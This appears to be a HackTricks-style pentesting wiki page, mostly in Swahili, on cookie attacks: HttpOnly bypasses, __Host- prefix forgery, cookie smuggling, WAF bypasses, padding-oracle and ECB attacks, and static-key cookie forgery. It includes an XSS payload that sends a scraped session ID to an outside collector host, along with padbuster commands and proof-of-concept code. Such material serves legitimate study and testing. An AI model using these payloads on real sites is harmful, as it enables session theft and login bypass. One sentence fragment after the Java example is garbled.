# Cookies Hacking

{{#include ../../banners/hacktricks-training.md}}

## Cookie Attributes

Cookies huja na vigezo kadhaa vinavyodhibiti tabia zao kwenye kivinjari cha mtumiaji. Hapa kuna muhtasari wa vigezo hivi kwa sauti isiyo ya moja kwa moja:

### Expires and Max-Age

Tarehe ya kumalizika kwa cookie inatambulika na sifa ya `Expires`. Kinyume chake, sifa ya `Max-age` inaelezea muda kwa sekunde hadi cookie ifutwe. **Tumia `Max-age` kwani inaendana na mbinu za kisasa.**

### Domain

Host zinazopokea cookie zinaainishwa na sifa ya `Domain`. Kwa chaguo-msingi, hii imewekwa kwa host iliyoitoa cookie, bila kuhusisha subdomains zake. Hata hivyo, wakati sifa ya `Domain` imewekwa wazi, inajumuisha pia subdomains. Hii inafanya matumizi ya sifa ya `Domain` kuwa chaguo lisilo na vikwazo vingi, linalofaa kwa matukio ambapo kushirikiana kwa cookie kati ya subdomains kunahitajika. Kwa mfano, kuweka `Domain=mozilla.org` kunafanya cookies zipatikane kwenye subdomains kama `developer.mozilla.org`.

### Path

Sifa ya `Path` inaonyesha njia maalum ya URL ambayo lazima iwepo katika URL iliyohitajika ili kichwa cha `Cookie` kitumwe. Sifa hii inazingatia tabia ya `/` kama mgawanyiko wa saraka, ikiruhusu mechi katika saraka ndogo pia.

### Ordering Rules

Wakati cookies mbili zina jina sawa, ile itakayochaguliwa kutumwa inategemea:

- Cookie inayolingana na path ndefu zaidi katika URL iliyohitajika.
- Cookie iliyowekwa hivi karibuni zaidi ikiwa path ni sawa.

### SameSite

- Sifa ya `SameSite` inaamua ikiwa cookies zitatumwa kwenye maombi yanayotoka kutoka kwa domain za watu wengine (third-party). Inatoa mipangilio mitatu:
- **Strict**: Inazuia cookie kutumwa kwenye maombi ya third-party.
- **Lax**: Inaruhusu cookie kutumwa na maombi ya GET yaliyoanzishwa na tovuti za third-party.
- **None**: Inaruhusu cookie kutumwa kutoka kwa domain yoyote ya third-party.

Kumbuka, wakati wa kusanidi cookies, kuelewa vigezo hivi kunaweza kusaidia kuhakikisha zinavyofanya kazi kama inavyotarajiwa katika matukio tofauti.

| **Aina ya Ombi** | **Mfano wa Msimbo**               | **Cookies Zinapotumwa Wakati** |
| ---------------- | ---------------------------------- | ------------------------------ |
| Link             | \<a href="...">\</a>               | NotSet\*, Lax, None            |
| Prerender        | \<link rel="prerender" href=".."/> | NotSet\*, Lax, None            |
| Form GET         | \<form method="GET" action="...">  | NotSet\*, Lax, None            |
| Form POST        | \<form method="POST" action="..."> | NotSet\*, None                 |
| iframe           | \<iframe src="...">\</iframe>      | NotSet\*, None                 |
| AJAX             | $.get("...")                       | NotSet\*, None                 |
| Image            | \<img src="...">                   | NetSet\*, None                 |

Table from [Invicti](https://www.netsparker.com/blog/web-security/same-site-cookie-attribute-prevent-cross-site-request-forgery/) and slightly modified.\
A cookie with _**SameSite**_ attribute itasaidia **kupunguza mashambulizi ya CSRF** ambapo session iliyonyoshwa inahitajika.

**\*Notice that from Chrome80 (feb/2019) the default behaviour of a cookie without a cookie samesite** **attribute will be lax** ([https://www.troyhunt.com/promiscuous-cookies-and-their-impending-death-via-the-samesite-policy/](https://www.troyhunt.com/promiscuous-cookies-and-their-impending-death-via-the-samesite-policy/)).\
Kumbuka kwamba kwa muda mfupi, baada ya kutekeleza mabadiliko haya, **cookies bila sera ya SameSite** katika Chrome zitatendewa kama **None** kwa kipindi cha **dakika 2 za kwanza** kisha kama Lax kwa ombi la POST la top-level lintokalo la cross-site.

## Cookies Flags

### HttpOnly

Hii inazuia **client** kupata cookie (kwa mfano kupitia **Javascript**: `document.cookie`)

#### **Bypasses**

- Ikiwa ukurasa unatumia cookies kama jibu la requests (kwa mfano kwenye ukurasa wa **PHPinfo**), inawezekana kuutumia XSS kutuma ombi kwa ukurasa huo na **kuiba cookies** kutoka kwenye response (angalia mfano katika [https://blog.hackcommander.com/posts/2022/11/12/bypass-httponly-via-php-info-page/](https://blog.hackcommander.com/posts/2022/11/12/bypass-httponly-via-php-info-page/)).
- Hii inaweza kupitishwa kwa kutumia requests za **TRACE HTTP** kwani response kutoka kwa server (ikiwa method hii inapatikana) itarudisha cookies zilizotumwa. Mbinu hii inaitwa **Cross-Site Tracking**.
- Mbinu hii imezuiliwa na vivinjari vya kisasa kwa kutoruhusu kutuma ombi la TRACE kutoka JS. Hata hivyo, baadhi ya njia za kupitisha hili zimetumika kwenye programu maalum kama kutuma `\r\nTRACE` badala ya `TRACE` kwa IE6.0 SP2.
- Njia nyingine ni kutumia udhaifu wa zero/day wa vivinjari.
- Inawezekana **kuandika juu ya HttpOnly cookies** kwa kufanya Cookie Jar overflow attack:


{{#ref}}
cookie-jar-overflow.md
{{#endref}}

- Inawezekana kutumia [**Cookie Smuggling**](#cookie-smuggling) attack ku-exfiltrate hizi cookies
- Ikiwa sehemu yoyote ya server-side inachapisha raw session ID katika HTTP response (mfano, ndani ya maoni ya HTML au block ya debug), unaweza kupitisha HttpOnly kwa kutumia XSS gadget kufetch endpoint hiyo, regex siri, na ku-exfiltrate. Mfano wa muundo wa payload ya XSS:
```js
// Extract content between <!-- startscrmprint --> ... <!-- stopscrmprint -->
const re = /<!-- startscrmprint -->([\s\S]*?)<!-- stopscrmprint -->/;
fetch('/index.php?module=Touch&action=ws')
.then(r => r.text())
.then(t => { const m = re.exec(t); if (m) fetch('https://collab/leak', {method:'POST', body: JSON.stringify({leak: btoa(m[1])})}); });
```
### Salama

Omba itatuma cookie katika ombi la HTTP **tu** ikiwa ombi limepelekwa kupitia chaneli salama (kawaida **HTTPS**).

## Viongezeo vya cookies

Cookies zilizo na kiambishi `__Secure-` zinahitajika kuwekwa pamoja na bendera ya `secure` kutoka kurasa zilizolindwa na HTTPS.

Kwa cookies zilizo na kiambishi `__Host-`, masharti kadhaa lazima yatimizwe:

- Zinapaswa kuwekwa zikiwa na bendera ya `secure`.
- Zinapaswa kutokana na ukurasa uliolindwa na HTTPS.
- Zinakatazwa kubainisha domain, kuzuia kusafirishwa kwa subdomains.
- Njia (path) kwa cookies hizi lazima iwe `/`.

Ni muhimu kutambua kuwa cookies zilizo na kiambishi `__Host-` haziruhusiwi kutumwa kwa superdomains au subdomains. Kizuizi hiki husaidia kutenganisha application cookies. Kwa hivyo, kutumia kiambishi `__Host-` kwa cookies zote za application kunaweza kuzingatiwa kama desturi nzuri ya kuimarisha usalama na kutenganisha.

### Kuandika tena cookies

Hivyo, moja ya ulinzi wa cookies zilizo na kiambishi `__Host-` ni kuzuia kuzibadilishwa kutoka subdomains. Hii inalenga kuzuia, kwa mfano, [**Cookie Tossing attacks**](cookie-tossing.md). Katika mazungumzo ya [**Cookie Crumbles: Unveiling Web Session Integrity Vulnerabilities**](https://www.youtube.com/watch?v=F_wAzF4a7Xg) ([**paper**](https://www.usenix.org/system/files/usenixsecurity23-squarcina.pdf)) ilielezwa kwamba ilikuwa inawezekana kuweka \_\_HOST- prefixed cookies kutoka subdomain, kwa kudanganya parser, kwa mfano, kwa kuongeza "=" mwanzoni au mwanzoni na mwishoni...:

<figure><img src="../../images/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Au kwa PHP ilikuwa inawezekana kuongeza **herufi nyingine mwanzoni** ya jina la cookie ambazo zingewekwa kama **underscore**, kuruhusu kuandika tena `__HOST-` cookies:

<figure><img src="../../images/image (7) (1) (1) (1) (1).png" alt="" width="373"><figcaption></figcaption></figure>


#### Unicode whitespace cookie-name smuggling (prefix forgery)

Tumia tofauti za uandishi kati ya browser na server kwa kuweka pointi ya whitespace ya Unicode mwanzoni mwa jina la cookie. Browser haitachukulia jina kuwa linaanza kwa `__Host-`/`__Secure-` kwa ufasaha, hivyo inaruhusu kuwekwa kutoka subdomain. Ikiwa backend inakata/inafanya normalize whitespace za Unicode zinazoongoza kwenye funguo za cookie, itayaona majina yaliyolindwa na inaweza kuandika tena cookie yenye ruhusa za juu.

- PoC kutoka subdomain inayoweza kuweka parent-domain cookies:
```js
document.cookie = `${String.fromCodePoint(0x2000)}__Host-name=injected; Domain=.example.com; Path=/;`;
```
- Tabia za kawaida za backend zinazowezesha tatizo:
- Frameworks zinazotrim/normalize cookie keys. Katika Django, Python’s `str.strip()` huondoa anuwai kubwa ya Unicode whitespace code points, ikasababisha jina kusawazishwa kuwa `__Host-name`.
- Code points ambazo kawaida hutrim ni pamoja na: U+0085 (NEL, 133), U+00A0 (NBSP, 160), U+1680 (5760), U+2000–U+200A (8192–8202), U+2028 (8232), U+2029 (8233), U+202F (8239), U+205F (8287), U+3000 (12288).
- Frameworks nyingi zinatatua majina ya cookie yanayojirudia kwa “last wins”, hivyo thamani ya cookie iliyosawazishwa inayodhibitiwa na mshambuliaji inaandika tena ile halali.

- Tofauti za browser ni muhimu:
- Safari inapiga marufuku multibyte Unicode whitespace katika majina ya cookie (mfano, inapokataa U+2000) lakini bado inaruhusu single-byte U+0085 na U+00A0, ambazo backend nyingi hufupisha. Fanya mitihani kwa vivinjari mbalimbali.

- Athari: Inawezesha kuandika tena `__Host-`/`__Secure-` cookies kutoka muktadha usio wa kuaminika (subdomains), ambavyo vinaweza kusababisha XSS (ikiwa inarudishwa), CSRF token override, na session fixation.

- On-the-wire vs server view example (U+2000 present in name):
```
Cookie: __Host-name=Real; â€€__Host-name=<img src=x onerror=alert(1)>;
```
Many backends split/parse and then trim, resulting in the normalized `__Host-name` taking the attacker’s value.

#### Ugawaji wa cookie wa Legacy `$Version=1` kwenye Java backends (prefix bypass)

Baadhi ya stacks za Java (e.g., Tomcat/Jetty-style) bado zinawezesha legacy RFC 2109/2965 parsing wakati header ya `Cookie` inaanza na `$Version=1`. Hii inaweza kusababisha server kutafsiri tena kamba moja ya cookie kama cookie nyingi za kimantiki na kukubali ingizo la bandia la `__Host-` ambalo awali lilikuwa limetengwa kutoka subdomain au hata kutoka kwa origin isiyo salama.

- PoC inayoamsha parsing ya legacy:
```js
document.cookie = `$Version=1,__Host-name=injected; Path=/somethingreallylong/; Domain=.example.com;`;
```
- Kwa nini ina fanya kazi:
- Client-side prefix checks zinaweza kutumika wakati wa set, lakini server-side legacy parsing baadaye hugawanya na ku-normalize header, hivyo kuepusha dhamira ya dhamana za prefix `__Host-`/`__Secure-`.

- Mahali pa kujaribu: Tomcat, Jetty, Undertow, au frameworks ambazo bado zinaheshimu RFC 2109/2965 attributes. Changanya na semantiki za overwrite za majina rudufu.

#### Msingi wa kuandika juu kwa majina rudufu (last-wins)

Wakati cookies mbili zina-normalize kwa jina moja, many backends (including Django) hutumia tukio la mwisho. Baada ya smuggling/legacy-splitting kuzalisha majina mawili ya `__Host-*`, ile inayodhibitiwa na mshambuliaji kawaida itashinda.

#### Ugunduzi na zana

Tumia Burp Suite kuchunguza hali hizi:

- Jaribu alama nyingi za nafasi za Unicode mwanzoni: U+2000, U+0085, U+00A0 na uangalie ikiwa backend inakata na kutendea jina kama lina prefix.
- Tuma `$Version=1` kwanza katika Cookie header na angalia ikiwa backend inafanya legacy splitting/normalization.
- Angalia azimio la majina rudufu (mwanzo vs mwisho unashinda) kwa kuingiza cookies mbili ambazo zina-normalize kwa jina moja.
- Burp Custom Action ili ku-automate hili: [CookiePrefixBypass.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/CookiePrefixBypass.bambda)

> Kidokezo: Mbinu hizi zinatumia pengo la octet-vs-string la RFC 6265: browsers hutuma bytes; servers hufasiri (decode) na zinaweza ku-normalize/kukata. Kutokueleana katika decoding na normalization ndiko msingi wa bypass.

## Mashambulizi ya Cookies

Kama cookie maalum ina data nyeti, iangalie (hasa ikiwa unacheza CTF), kwani inaweza kuwa dhaifu.

### Kufasiri na Kubadilisha Cookies

Data nyeti iliyojumuishwa katika cookies inapaswa kukaguliwa kwa makini kila wakati. Cookies zilizofichwa kwa Base64 au formats zinazofanana mara nyingi zinaweza kufasiriwa. Udhaifu huu unamruhusu mshambuliaji kubadilisha yaliyomo kwenye cookie na kujifanya watumiaji wengine kwa kuficha data iliyobadilishwa kurudi kwenye cookie.

### Session Hijacking

Shambulizi hili linahusisha kuiba cookie ya mtumiaji ili kupata ufikiaji usioidhinishwa kwenye akaunti yao ndani ya application. Kwa kutumia cookie iliyochukuliwa, mshambuliaji anaweza kujifanya mtumiaji halali.

### Session Fixation

Katika tukio hili, mshambuliaji anamshawishi mwathiriwa kutumia cookie maalum wakati wa kuingia. Ikiwa application haitoi cookie mpya baada ya kuingia, mshambuliaji akiwa na cookie ya awali anaweza kujifanya mwathiriwa. Mbinu hii inategemea mwathiriwa kuingia akiwa ameingizwa cookie iliyotolewa na mshambuliaji.

If you found an **XSS in a subdomain** or you **control a subdomain**, read:


{{#ref}}
cookie-tossing.md
{{#endref}}

### Session Donation

Hapa, mshambuliaji anamshawishi mwathiriwa kutumia cookie ya session ya mshambuliaji. Mwathiriwa, akidhani ameingia kwenye akaunti yake mwenyewe, bila kutaka ataweka vitendo katika muktadha wa akaunti ya mshambuliaji.

If you found an **XSS in a subdomain** or you **control a subdomain**, read:


{{#ref}}
cookie-tossing.md
{{#endref}}

### [JWT Cookies](../hacking-jwt-json-web-tokens.md)

Bofya kiungo kilicho hapo juu kufikia ukurasa unaoelezea mapungufu yanayoweza kuwepo katika JWT.

JSON Web Tokens (JWT) zinazotumika katika cookies zinaweza pia kuonyesha udhaifu. Kwa taarifa za kina kuhusu mapungufu yanayowezekana na jinsi ya kuyachukua, inashauriwa kufikia hati iliyounganishwa kuhusu hacking JWT.

### Cross-Site Request Forgery (CSRF)

Shambulizi hili linawalazimisha watumiaji waliokuwa wameingia kutekeleza vitendo wasivotaka kwenye web application ambamo wako sasa wameidhinishwa. Washambuliaji wanaweza kutumia cookies ambazo zinatumwa moja kwa moja na kila ombi kwa tovuti iliyo hatarini.

### Empty Cookies

(Angalia maelezo zaidi katika [original research](https://blog.ankursundara.com/cookie-bugs/)) Browsers zinaruhusu kuundwa kwa cookies bila jina, jambo ambalo linaweza kuonyeshwa kupitia JavaScript kama ifuatavyo:
```js
document.cookie = "a=v1"
document.cookie = "=test value;" // Setting an empty named cookie
document.cookie = "b=v2"
```
Matokeo katika sent cookie header ni `a=v1; test value; b=v2;`. Kwa kushangaza, hili linawezesha kuchezea cookie ikiwa cookie yenye jina tupu imewekwa, na inaweza kudhibiti cookie nyingine kwa kuweka cookie yenye jina tupu kwa thamani maalum:
```js
function setCookie(name, value) {
document.cookie = `${name}=${value}`
}

setCookie("", "a=b") // Setting the empty cookie modifies another cookie's value
```
Hii husababisha kivinjari kutuma cookie header inayotafsiriwa na kila web server kama cookie yenye jina `a` na thamani `b`.

#### Chrome Bug: Tatizo la Unicode Surrogate Codepoint

Katika Chrome, ikiwa Unicode surrogate codepoint ni sehemu ya set cookie, `document.cookie` inaharibika na baadaye inarudisha string tupu:
```js
document.cookie = "\ud800=meep"
```
Hii inasababisha `document.cookie` kutoa string tupu, ikionyesha uharibifu wa kudumu.

#### Cookie Smuggling Due to Parsing Issues

(Angalia maelezo zaidi katika [original research](https://blog.ankursundara.com/cookie-bugs/)) Seva kadhaa za wavuti, ikiwemo zile kutoka Java (Jetty, TomCat, Undertow) na Python (Zope, cherrypy, web.py, aiohttp, bottle, webob), hushughulikia vibaya cookie strings kutokana na msaada wa zamani wa RFC2965. Huwasoma cookie value iliyowekwa katika nukuu mbili kama value moja hata ikiwa ina semicolons, ambazo kwa kawaida zinapaswa kutenganisha key-value pairs:
```
RENDER_TEXT="hello world; JSESSIONID=13371337; ASDF=end";
```
#### Udhaifu za Cookie Injection

(Check further details in the[original research](https://blog.ankursundara.com/cookie-bugs/)) Kusomwa kwa cookie kwa njia isiyo sahihi na seva, hasa Undertow, Zope, na zile zinazotumia Python's `http.cookie.SimpleCookie` na `http.cookie.BaseCookie`, huunda fursa za cookie injection attacks. Seva hizi zinashindwa kutenganisha kwa usahihi mwanzo wa cookie mpya, na kuwapa wadukuzi uwezo wa kuunda cookie za uwongo:

- Undertow inatarajia cookie mpya mara moja baada ya thamani iliyowekwa kwa nukuu bila semikolon.
- Zope inatafuta koma kuanza kusoma cookie inayofuata.
- Darasa za cookie za Python huanza kusoma wakati wa kuonekana kwa tabia ya nafasi.

Udhaifu huu ni hatari hasa katika web applications zinazotegemea cookie-based CSRF protection, kwani unamruhusu mwizi kuingiza spoofed CSRF-token cookies, na kutenda kama njia ya kupita hatua za usalama. Tatizo linaongezeka kutokana na jinsi Python inavyoshughulikia majina ya cookie yanayojirudia, ambapo tukio la mwisho linafunga la awali. Pia linasababisha wasiwasi kwa `__Secure-` na `__Host-` cookies katika muktadha usio salama na linaweza kusababisha authorization bypasses wakati cookie zinapitishwa kwa back-end servers zilizoathirika kwa spoofing.

### Cookies $version

#### WAF Bypass

According to [**this blogpost**](https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie), inaweza kuwa inawezekana kutumia cookie attribute **`$Version=1`** ili kufanya backend itumie logic ya zamani kuiparse cookie kutokana na **RFC2109**. Zaidi ya hayo, values nyingine kama **`$Domain`** na **`$Path`** zinaweza kutumika kubadilisha tabia ya backend kwa cookie.

#### Cookie Sandwich Attack

According to [**this blogpost**](https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique) inawezekana kutumia cookie sandwich technique kuiba HttpOnly cookies. Hizi ndizo mahitaji na hatua:

- Tafuta sehemu ambapo cookie inayojionyesha kuwa isiyo na maana inarejeshwa katika response
- **Tengeneza cookie inayoitwa `$Version`** yenye value `1` (unaweza kufanya hili katika XSS attack kupitia JS) na path maalum ili ipewez nafasi ya awali (mfumo fulani kama Python hawahitaji hatua hii)
- **Tengeneza cookie inayorejeshwa** yenye thamani inayotia **nukuu mbili wazi** na path maalum ili iwe katika posisheni ya cookie db baada ya ile ya awali (`$Version`)
- Kisha, cookie halali itaenda ijayo katika mfuatano
- **Tengeneza cookie dummy inayofunga nukuu mbili** ndani ya value yake

Kwa njia hii cookie ya mwathiriwa inakamatwa ndani ya cookie mpya version 1 na itaonekana (itarejeshwa) kila inaporejeshwa.
e.g. from the post:
```javascript
document.cookie = `$Version=1;`;
document.cookie = `param1="start`;
// any cookies inside the sandwich will be placed into param1 value server-side
document.cookie = `param2=end";`;
```
### WAF bypasses

#### Cookies $version

Angalia sehemu iliyopita.

#### Bypassing value analysis with quoted-string encoding

Uchambuzi huu unaonyesha kuondoa escape kwa values zilizofichwa ndani ya cookies, hivyo "\a" becomes "a". Hii inaweza kusaidia bypass WAFS kama:

- `eval('test') => forbidden`
- `"\e\v\a\l\(\'\t\e\s\t\'\)" => allowed`

#### Bypassing cookie-name blocklists

Katika RFC2109 imeonyesha kwamba **comma can be used as a separator between cookie values**. Pia inawezekana kuongeza **spaces and tabs before an after the equal sign**. Kwa hiyo cookie kama `$Version=1; foo=bar, abc = qux` haitaundi cookie `"foo":"bar, admin = qux"` bali inaunda cookies `foo":"bar"` na `"admin":"qux"`. Angalia jinsi cookies 2 zinavyoundwa na jinsi nafasi zilivyoondolewa kabla na baada ya alama ya usawa.

#### Bypassing value analysis with cookie splitting

Hatimaye backdoors tofauti huunganisha cookie tofauti zilizotumwa kwenye cookie headers tofauti, kama katika:
```
GET / HTTP/1.1
Host: example.com
Cookie: param1=value1;
Cookie: param2=value2;
```
Ambayo inaweza kuwezesha bypass ya WAF kama katika mfano huu:
```
Cookie: name=eval('test//
Cookie: comment')

Resulting cookie: name=eval('test//, comment') => allowed
```
### Ukaguzi wa Ziada wa Cookies Zenye Udhaifu

#### **Ukaguzi wa Msingi**

- **cookie** ni **ile ile** kila unapofanya **login**.
- Log out kisha jaribu kutumia **cookie** ile ile.
- Jaribu kuingia kwa vifaa 2 (au vivinjari) kwenye akaunti ile ile ukitumia **cookie** ile ile.
- Angalia kama **cookie** ina taarifa yoyote ndani yake na jaribu kuibadilisha.
- Jaribu kuunda akaunti kadhaa zenye username zinazofanana karibu na angalia kama unaweza kuona mfanano.
- Angalia chaguo la "**remember me**" ikiwa lipo ili kuona jinsi linavyofanya kazi. Ikiwa lipo na linaweza kuwa dhaifu, tumia kila wakati **cookie** ya **remember me** bila cookie nyingine yoyote.
- Angalia kama **cookie** ya awali inafanya kazi hata baada ya kubadilisha **password**.

#### **Mashambulizi ya cookies ya juu**

Ikiwa **cookie** inabaki ile ile (au karibu) unapofanya **login**, hii ina maana kuwa **cookie** inahusishwa na sehemu fulani ya akaunti yako (labda **username**). Kisha unaweza:

- Jaribu kuunda nyingi za **akaunti** zenye usernames zinazofanana sana na jaribu **guess** jinsi algorithm inavyofanya kazi.
- Jaribu **bruteforce the username**. If the **cookie** saves only as an authentication method for your **username**, then you can create an account with username "**Bmin**" and **bruteforce** every single **bit** of your **cookie** because one of the cookies that you will try will be the one belonging to "**admin**".
- Jaribu **Padding** **Oracle** (unaweza ku-decrypt content ya **cookie**). Tumia **padbuster**.

**Padding Oracle - Padbuster examples**
```bash
padbuster <URL/path/when/successfully/login/with/cookie> <COOKIE> <PAD[8-16]>
# When cookies and regular Base64
padbuster http://web.com/index.php u7bvLewln6PJPSAbMb5pFfnCHSEd6olf 8 -cookies auth=u7bvLewln6PJPSAbMb5pFfnCHSEd6olf

# If Base64 urlsafe or hex-lowercase or hex-uppercase --encoding parameter is needed, for example:
padBuster http://web.com/home.jsp?UID=7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6
7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6 8 -encoding 2
```
Padbuster itafanya jaribio kadhaa na itakuuliza ni hali gani ndiyo error condition (ile ambayo si halali).

Kisha itaanza decrypting the cookie (inaweza kuchukua dakika kadhaa)

Ikiwa attack imefanyika kwa mafanikio, basi unaweza kujaribu encrypt string unayotaka. Kwa mfano, ikiwa ungependa **encrypt** **user=administrator**
```
padbuster http://web.com/index.php 1dMjA5hfXh0jenxJQ0iW6QXKkzAGIWsiDAKV3UwJPT2lBP+zAD0D0w== 8 -cookies thecookie=1dMjA5hfXh0jenxJQ0iW6QXKkzAGIWsiDAKV3UwJPT2lBP+zAD0D0w== -plaintext user=administrator
```
Utekelezaji huu utakupa cookie iliyosimbwa na iliyokodishwa kwa usahihi ikiwa na kamba **user=administrator** ndani.

**CBC-MAC**

Huenda cookie inaweza kuwa na thamani fulani na kusainiwa kwa kutumia CBC. Hivyo, uadilifu wa thamani ni saini inayotengenezwa kwa kutumia CBC na thamani hiyo hiyo. Kwa kuwa inapendekezwa kutumia kama IV null vector, aina hii ya ukaguzi wa uadilifu inaweza kuwa dhaifu.

**Ushambulizi**

1. Pata saini ya jina la mtumiaji **administ** = **t**
2. Pata saini ya jina la mtumiaji **rator\x00\x00\x00 XOR t** = **t'**
3. Weka katika cookie thamani **administrator+t'** (**t'** itakuwa saini halali ya **(rator\x00\x00\x00 XOR t) XOR t** = **rator\x00\x00\x00**)

**ECB**

If the cookie is encrypted using ECB it could be vulnerable.\
When you log in the cookie that you receive has to be always the same.

**Jinsi ya kugundua na kushambulia:**

Unda watumiaji 2 wenye data karibu sawa (jina la mtumiaji, nenosiri, barua pepe, nk.) na jaribu kugundua muundo ndani ya cookie iliyotolewa.

Unda mtumiaji aliyeitwa kwa mfano "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" na angalia kama kuna muundo wowote kwenye cookie (kwa kuwa ECB inasimba kwa ufunguo mmoja kila block, bytes zilizofichwa zinazoweza kuonekana ikiwa jina la mtumiaji limesimbwa).

Kutakuwa na muundo (kwa ukubwa wa block inayotumika). Hivyo, ukijua jinsi kundi la "a" linavyosimbwa unaweza kuunda jina la mtumiaji: "a"\*(size of the block)+"admin". Kisha, unaweza kufuta muundo uliosimbwa wa block ya "a" kutoka cookie. Na utakuwa na cookie ya jina la mtumiaji "admin".

### Static-key cookie forgery (symmetric encryption of predictable IDs)

Baadhi ya programu huunda authentication cookies kwa kusimba tu thamani inayoweza kutabirika (mf., the numeric user ID) chini ya key ya symmetric iliyowekwa kimwili kwa ujumla, kisha kuencode ciphertext (hex/base64). Ikiwa key ni static kwa bidhaa (au kwa install), mtu yeyote anaweza kutengeneza cookies za watumiaji wowote offline na kupita authentication.

How to test/forge
- Tambua cookie(s) ambazo zinaendesha auth, mf., COOKIEID na ADMINCOOKIEID.
- Tambua cipher/encoding. Katika kesi moja ya ulimwengu halisi app ilitumia IDEA na key thabiti ya 16-byte na kurudisha ciphertext kama hex.
- Thibitisha kwa kusimba user ID yako mwenyewe na kulinganisha na cookie iliyotolewa. Ikiwa inafanana, unaweza kutengeneza cookies kwa ID yoyote ya lengo (1 mara nyingi inalingana na admin wa kwanza).
- Weka thamani iliyofunguliwa (forged) moja kwa moja kama cookie na tembelea tovuti; hakuna nyaraka za kuingia zinahitajika.

<details>
<summary>Mfano mdogo wa Java PoC (IDEA + hex) ulioonekana kwa vitendo</summary>
```java
import cryptix.provider.cipher.IDEA;
import cryptix.provider.key.IDEAKeyGenerator;
import cryptix.util.core.Hex;
import java.security.Key;
import java.security.KeyException;
import java.io.UnsupportedEncodingException;

public class App {
private String ideaKey = "1234567890123456"; // example static key

public String encode(char[] plainArray) { return encode(new String(plainArray)); }

public String encode(String plain) {
IDEAKeyGenerator keygen = new IDEAKeyGenerator();
IDEA encrypt = new IDEA();
Key key;
try {
key = keygen.generateKey(this.ideaKey.getBytes());
encrypt.initEncrypt(key);
} catch (KeyException e) { return null; }
if (plain.length() == 0 || plain.length() % encrypt.getInputBlockSize() > 0) {
for (int currentPad = plain.length() % encrypt.getInputBlockSize(); currentPad < encrypt.getInputBlockSize(); currentPad++) {
plain = plain + " "; // space padding
}
}
byte[] encrypted = encrypt.update(plain.getBytes());
return Hex.toString(encrypted); // cookie expects hex
}

public String decode(String chiffre) {
IDEAKeyGenerator keygen = new IDEAKeyGenerator();
IDEA decrypt = new IDEA();
Key key;
try {
key = keygen.generateKey(this.ideaKey.getBytes());
decrypt.initDecrypt(key);
} catch (KeyException e) { return null; }
byte[] decrypted = decrypt.update(Hex.fromString(chiffre));
try { return new String(decrypted, "ISO_8859-1").trim(); } catch (UnsupportedEncodingException e) { return null; }
}

public void setKey(String key) { this.ideaKey = key; }
}
```
</details>muktadha (kwa mfano, kikao upande wa seva chenye ID nasibu, au ongeza anti-replay properties).

## References

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)
- [https://blog.ankursundara.com/cookie-bugs/](https://blog.ankursundara.com/cookie-bugs/)
- [https://www.linkedin.com/posts/rickey-martin-24533653_100daysofhacking-penetrationtester-ethicalhacking-activity-7016286424526180352-bwDd](https://www.linkedin.com/posts/rickey-martin-24533653_100daysofhacking-penetrationtester-ethicalhacking-activity-7016286424526180352-bwDd)
- [https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie](https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie)
- [https://seclists.org/webappsec/2006/q2/181](https://seclists.org/webappsec/2006/q2/181)
- [https://www.michalspacek.com/stealing-session-ids-with-phpinfo-and-how-to-stop-it](https://www.michalspacek.com/stealing-session-ids-with-phpinfo-and-how-to-stop-it)
- [https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [Cookie Chaos: How to bypass __Host and __Secure cookie prefixes](https://portswigger.net/research/cookie-chaos-how-to-bypass-host-and-secure-cookie-prefixes)
- [Burp Custom Action – CookiePrefixBypass.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/CookiePrefixBypass.bambda)

{{#include ../../banners/hacktricks-training.md}}
